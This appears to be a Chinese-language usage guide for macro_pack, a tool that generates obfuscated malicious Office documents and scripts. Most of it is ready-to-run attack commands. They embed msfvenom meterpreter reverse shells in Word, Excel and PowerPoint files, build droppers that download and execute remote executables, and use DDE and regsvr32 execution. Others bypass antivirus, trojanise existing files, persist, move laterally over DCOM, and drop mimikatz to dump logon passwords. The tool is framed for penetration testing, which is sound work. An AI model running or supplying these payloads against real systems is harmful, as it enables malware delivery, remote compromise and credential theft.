#### macro_pack
macro_pack 是一个用于自动生成混淆过的 MS Office 文档、VB 脚本等其他格式的工具，其主要目的是用于渗透测试、demo 以及社会工程学的评估

#### 使用工具
- 不需要配置
- 一切都可以使用一行代码来完成
- 生成大部分 Office 格式和基于 VBS 的格式
- 高级 VBA 宏攻击以及 DDE 攻击

#### 基本混淆
- 命名函数
- 重命名变量
- 删除空格
- 删除评论
- 编码字符串

#### 生成
Macro Pack 可以生成多种 MS Office 文档和脚本格式

#### Ms Office支持的格式
- MS Word 97 (.doc)
- MS Word (.docm, .docx)
- MS Excel 97 (.xls)
- MS Excel (.xlsm, .xslx)
- MS PowerPoint (.pptm)
- MS Visio 97 (.vsd)
- MS Visio (.vsdm)
- MS Project (.mpp)

#### 脚本（txt）支持的格式
- VBA文本文件（.vba）
- VBS文本文件（.vbs）
- Windows脚本文件（.wsf）
- Windows脚本组件脚本（.wsc，.sct）
- HTML应用程序（.hta）
- XSLT样式表（.xsl）（MS XSLT包含脚本）

#### 支持的快捷键格式
- Shell链接（.lnk）
- 资源管理器命令文件（.scf）
- 网址快捷方式（.url）
- Groove快捷键（.glk）

#### 专业模式
- 高级反恶意软件绕过
- VBOM安全绕过
- 自解码VBA
- MS Office权限维持
- MS Office文档木马
- 使用DCOM对象进行内网漫游
- 使用http://seclists.org/fulldisclosure/2017/Mar/90反调试

#### 运行Windows二进制
```
从https://github.com/sevagas/macro_pack/releases/获取最新的二进制文件
在安装了正版Microsoft Office的PC上下载二进制文件。
打开控制台，CD到二进制目录并调用二进制文件，就这么简单
```

#### 从源码安装
```
git clone https://github.com/sevagas/macro_pack.git
cd macro_pack
pip3 install -r requirements.txt
```

#### macro_pack community
- 混淆由msfvenom生成的vba文件
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba
```
- 混淆Empire stager vba文件并生成MS Word文档
```
macro_pack.exe -f empire.vba -o -G myDoc.docm
```
- 生成一个包含混淆dropper的MS Excel文件
```
echo "https://myurl.url/payload.exe" "dropped.exe" |  macro_pack.exe -o -t DROPPER -G "drop.xlsm" 
```
- 创建一个包含混淆的VBA reverse meterpreter payload的 word 97 文档
```
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G \\REMOTE-PC\Share\meter.doc   
```
- 使用DROPPER_PS模板下载并执行Empire Launcher stager，而不使用powershell.exe
```
# 1 Generate a fiez containing Empire lauchcher
# 2 Make that file available on web server, ex with netcat:
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat empire_stager.cmd; } | nc -l -p 6666 -q1
# 3 Use macro\_pack  to generate DROPPER_PS payload in Excel file
echo http://10.5.5.12:6543/empire_stager.cmd | macro_pack.exe -o -t DROPPER_PS -G join_the_empire.xls
# 4 When executed on target, the macro will download PowerShdll, run it with rundll32, and download and execute stager
```
- 通过动态数据交换（DDE）攻击执行calc.exe
```
echo calc.exe | macro_pack.exe --dde -G calc.xslx
```
- 使用动态数据交换（DDE）攻击，通过PowerShell下载并执行文件
```
# 1 Change the target file URL in resources\community\ps_dl_exec.cmd
# 2 Embed download execute cmd in document
python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
```
- 生成混淆的Meterpreter reverse TCP VBS文件并运行它
```
# 1 Generate obfuscated VBS based on meterpreter template
echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.vbs
# 2 On attacker machine Setup meterpreter listener
Open msfconsole:
use exploit/multi/handler
set LHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
# 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
%windir%\SysWoW64\wscript meter.vbs
```

- 生成混淆的HTA文件，该文件执行“systeminfo”并将结果返回到另一个在192.168.0.5上监听的macro_pack
```
# 1 Generate HTA file with CMD template
echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
# 2 On 192.168.0.5 open macro_pack as http listener
macro_pack.exe -l 1234
# 3 run hta file with mshta
mshta.exe full/path/to/info.hta
```
```
echo "file://C:\Users\username\Desktop\hello.hta" | macro_pack.exe -G yop.url
```
```
echo '"c:\Windows\System32\cmd.exe /c calc.exe" "calc.exe"' | macro_pack.exe -G calc.lnk
```
```
# 1 Generate obfuscated VBS scriptlet based on meterpreter reverse HTTPS template
echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
# 2 On attacker machinge Setup meterpreter listener
Open msfconsole:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <attacker_ip> # NOTE this cannot be 0.0.0.0 for reverse https
set LPORT <port>
set AutoRunScript post/windows/manage/migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
exploit -j
# 3 run scriptlet with regsvr32 
regsvr32 /u /n /s /i:meter.sct scrobj.dll
```

#### macro_pack pro
```
echo "http://10.5.5.12/drop.exe" "dropped.exe" | macro_pack.exe -o -t DROPPER2 --trojan --av-bypass --stealth  -G "E:\accounting\report.xls"   
```
- 生成一个包含VBA自编码x64 reverse meterpreter VBA
```
msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --vbom-encode --keep-alive  -G  out.docm
```
- PowerPoint文件与木马以及reverse meterpreter
```
msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --av-bypass --trojan -G  hotpics.pptm
```
- 使用DCOM在远程PC上执行宏
```
REM Step 1: Ensure you have enough rights
net use  \\192.168.0.8\c$ /user:domain\username password
REM Step 2: Generate document, for example here, meterpreter reverse TCP Excel file
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G meter.xlsm
REM Step 3: Copy the document  somewhere on remote share
copy meter.xlsm "\\192.168.0.8\c$\users\username\meter.xlsm"
REM Step 4: Execute!
macro_pack.exe --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"
REM Step 2 to 4 in one step:
echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\users\username\meter.xlsm" --dcom="\\192.168.0.8\c$\users\username\meter.xlsm"
```

#### macro_pack Pro支持
```
-b, --background    Run the macro in background (in another instance of office application)
  --vbom-encode   Use VBA self encoding to bypass antimalware detection and enable VBOM access (will exploit VBOM self activation vuln).
                --start-function option may be needed.
  --av-bypass  Use various tricks  efficient to bypass most av (combine with -o for best result)
  --keep-alive    Use with --vbom-encode option. Ensure new app instance will stay alive even when macro has finished
  --persist       Use with --vbom-encode option. Macro will automatically be persisted in application startup path
                  (works with Excel documents only). The macro will then be executed anytime an Excel document is opened (even non-macro documents).
  -T, --trojan=OUTPUT_FILE_PATH   Inject macro in an existing MS office file. 
                  Supported files are the same as for the -G option.
                  Files will also be converted to approriate format, ex: pres.pptx will become pres.pptm
                  If file does not exist, it will be created (like -G option)
  --stealth      Anti-debug and hiding features
  --dcom=REMOTE_FILE_PATH Open remote document using DCOM for pivot/remote exec if psexec not possible for example.
                 This will trigger AutoOpen/Workboo_Open automatically. 
                 If no auto start function, use --start-function option to indicate which macro to run.
```

#### 模板使用
使用 -t, –template=TEMPLATE_NAME结合其他选项来调用模板

#### HELLO
只打印一条hello消息并了解宏
```
echo "@Author" | macro_pack.exe -t HELLO -G hello.pptm
```

#### CMD
执行命令行并将结果发送到远程http服务器
```
# Catch result with any webserver or netcat
nc -l -p 7777
```

#### DROPPER
为此模板提供文件url和目标文件路径
```
echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -G dropper.xls
```

#### DROPPER2
为此模板提供文件url和目标文件路径
```
echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -G dropper.xlsm
```

#### DROPPER_PS
使用rundll32下载并执行Powershell脚本（绕过被阻止的powershell.exe）
```
echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc
```

#### DROPPER_DLL
使用另一个扩展下载DLL并使用Office VBA运行它
```
REM Generate meterpreter dll payload
msfvenom.bat  -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f dll -o meter.dll
REM Make it available on webserver, ex using netcat on port 6666
{ echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat meter.dll; } | nc -l -p 6666 -q1
REM Create OFfice file which will download DLL and call it
REM The DLL URL is http://192.168.0.5:6666/normal.html and it will be saved as .asd file
echo "http://192.168.0.5:6666/normal.html" Run | macro_pack.exe -t DROPPER_DLL -o -G meterdll.xls
```
#### METERPRETER
模板提供监听msfconsole的IP和端口
```
echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm
```
推荐的msfconsole选项
```
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
set AutoRunScript post/windows/manage/migrate
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
exploit -j
```
#### WEBMETER
Meterpreter使用Cn33liz的VbsMeter reverse TCP模板
- 为此模板提供监听msfconsole的IP和端口
```
echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.vsd
```
- 推荐的msfconsole选项
```
set PAYLOAD windows/meterpreter/reverse_https (32bit)
set PAYLOAD windows/x64/meterpreter/reverse_https (64bit)
set AutoRunScript post/windows/manage/migrate
set LHOST <ip>
set LPORT <port>
set EXITFUNC thread
set ExitOnSession false
set EnableUnicodeEncoding true
set EnableStageEncoding true
exploit -j
```

#### EMBED_EXE
结合–embed选项，它将删除并执行（隐藏）嵌入文件
```
macro_pack.exe -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.vbs
echo "path\\to\newcalc.exe" | macro_pack.exe -t EMBED_EXE --embed=%%windir%%\system32\calc.exe -o -G my_calc.doc
```

#### EMBED_DLL
结合使用–embed选项，它将删除并调用给定DLL中的函数
```
echo "main" | macro_pack.exe -t EMBED_DLL --embed=cmd.dll -o -G cmd.doc 
echo "main log privilege::debug sekurlsa::logonpasswords exit" | macro_pack.exe -t EMBED_DLL --embed=mimikatz.dll -o -G mimidropper.hta
```


